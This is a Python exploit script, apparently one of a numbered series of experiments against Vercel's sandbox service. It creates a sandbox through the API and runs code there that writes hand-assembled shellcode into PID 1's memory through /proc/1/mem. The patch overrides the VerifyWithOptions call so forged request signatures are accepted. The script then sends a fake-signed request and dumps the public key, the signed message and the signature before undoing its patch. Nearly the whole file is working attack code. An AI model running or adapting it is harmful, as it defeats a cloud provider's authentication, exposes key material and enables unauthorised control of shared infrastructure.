# 实验J209: patch 0x83b553(call VerifyWithOptions处) -> shellcode dump全参数 + 返valid=false(放行)
# j195反汇编确认0x83b553调用点寄存器: rax=pub.ptr rbx=pub.len rcx=msg.ptr rdi=msg.len rsi=sig.ptr r8=sig.len
# 返回rax=0 -> 0x83b558 test rax,rax; je 0x83b58e -> verify返nil -> wrapunary放行(沙箱不死)
# 输出: PUB(当前沙箱真实公钥) + MSG(签名消息原文!) + SIG(我们发的签名)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=20000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj209"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE = r'''
import os, time, socket, struct
out = open("/tmp/d209.txt", "w")
def p(*a):
    line = " ".join(str(x) for x in a)
    out.write(line + "\n"); out.flush()
    print(line, flush=True)

p("start")
fd = os.open("/proc/1/mem", os.O_RDWR)
def read_at(addr, n):
    os.lseek(fd, addr, 0)
    return os.read(fd, n)
def write_at(addr, b):
    os.lseek(fd, addr, 0)
    return os.write(fd, b)

# PA: 找text空区
p("CP", "PA")
os.lseek(fd, 0x400000, 0)
buf = os.read(fd, 0x8db000 - 0x400000)
i = buf.find(b"\x00" * 64)
if i < 0:
    i = buf.find(b"\xcc" * 64)
SC = 0x400000 + i
p("HOLE", hex(SC))

# shellcode: dump VerifyWithOptions参数到SAVE + 返rax=0(valid=false -> verify nil -> 放行)
SAVE = 0x2ee1000
sc = bytes.fromhex(
    "49 89 c2"                    # mov r10, rax        ; r10 = pub.ptr
    "49 89 cb"                    # mov r11, rcx        ; r11 = msg.ptr
    "48 b8 0010ee0200000000"      # movabs rax, 0x2ee1000 (SAVE)
    "4c 89 10"                    # mov [rax], r10      ; SAVE+0x00 = pub.ptr
    "48 89 58 08"                 # mov [rax+8], rbx    ; SAVE+0x08 = pub.len
    "4c 89 58 10"                 # mov [rax+0x10], r11 ; SAVE+0x10 = msg.ptr
    "48 89 78 18"                 # mov [rax+0x18], rdi ; SAVE+0x18 = msg.len
    "48 89 70 20"                 # mov [rax+0x20], rsi ; SAVE+0x20 = sig.ptr
    "4c 89 40 28"                 # mov [rax+0x28], r8  ; SAVE+0x28 = sig.len
    "31 c0"                       # xor eax, eax
    "31 db"                       # xor ebx, ebx
    "c3"                          # ret
)
p("SC_LEN", len(sc))
write_at(SC, sc)
p("SC_WRITE", read_at(SC, len(sc)).hex() == sc.hex())

# patch 0x83b553 (call 0x5f3a80) -> call SC
CALL = 0x83b553
orig = read_at(CALL, 5)
rel = SC - (CALL + 5)
patch = bytes([0xe8]) + struct.pack("<i", rel)
write_at(CALL, patch)
p("PATCH", orig.hex(), "->", read_at(CALL, 5).hex(), "OK" if read_at(CALL, 5) == patch else "FAIL")

# 清SAVE
write_at(SAVE, b"\x00" * 0x40)

# PC: REQ1 (触发verify -> shellcode dump参数)
p("CP", "PC")
def http(port, method, path, headers, body=b"", to=5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(to)
        s.connect(("127.0.0.1", port))
        hdrs = f"{method} {path} HTTP/1.1\r\nHost: 127.0.0.1\r\n"
        for k, v in headers.items():
            hdrs += f"{k}: {v}\r\n"
        hdrs += f"Content-Length: {len(body)}\r\n\r\n"
        s.send(hdrs.encode() + body)
        d = b""
        try:
            while True:
                b2 = s.recv(4096)
                if not b2:
                    break
                d += b2
                if len(d) > 4000:
                    break
        except Exception:
            pass
        s.close()
        return d
    except Exception as ex:
        return ("EXC:" + repr(ex)).encode()

now = str(int(time.time()))
d = http(30001, "POST", "/foo",
         {"Content-Type": "application/connect+json", "Connect-Protocol-Version": "1",
          "X-Signature": "AAAA", "X-Timestamp": now}, b"{}")
p("REQ1_RESP", d[:300])
time.sleep(0.6)

# PD: 读SAVE -> 解析参数 -> dump pub/msg/sig
p("CP", "PD")
sv = read_at(SAVE, 0x40)
p("SAVE", sv.hex())
pub_ptr, pub_len = struct.unpack("<QQ", sv[0:16])
msg_ptr, msg_len = struct.unpack("<QQ", sv[16:32])
sig_ptr, sig_len = struct.unpack("<QQ", sv[32:48])
p("PARAMS", hex(pub_ptr), pub_len, hex(msg_ptr), msg_len, hex(sig_ptr), sig_len)
try:
    pub = read_at(pub_ptr, pub_len)
    p("PUB", pub.hex())
except Exception as e:
    p("PUB_ERR", repr(e))
try:
    msg = read_at(msg_ptr, min(msg_len, 256))
    p("MSG_HEX", msg.hex())
    s = "".join(chr(c) if 32 <= c < 127 else "." for c in msg)
    p("MSG_STR", repr(s))
except Exception as e:
    p("MSG_ERR", repr(e))
try:
    sig = read_at(sig_ptr, min(sig_len, 128))
    p("SIG", sig.hex())
except Exception as e:
    p("SIG_ERR", repr(e))

# PE: 还原
p("CP", "PE")
try:
    write_at(CALL, orig)
    p("RESTORE_CALL", read_at(CALL, 5).hex())
    write_at(SC, b"\x00" * len(sc))
    p("RESTORE_SC", "ok")
except Exception as e:
    p("RESTORE_ERR", repr(e))
p("done")
out.close()
os.close(fd)
'''

st = run_cmd(sid, CODE, "J209", timeout=290)
time.sleep(2)
bashfile(sid, "cat /tmp/d209.txt", "marker", 15000)
if st == "DEAD":
    print("\n!!! DEATH -> I-cache未生效, 需重试新沙箱", flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
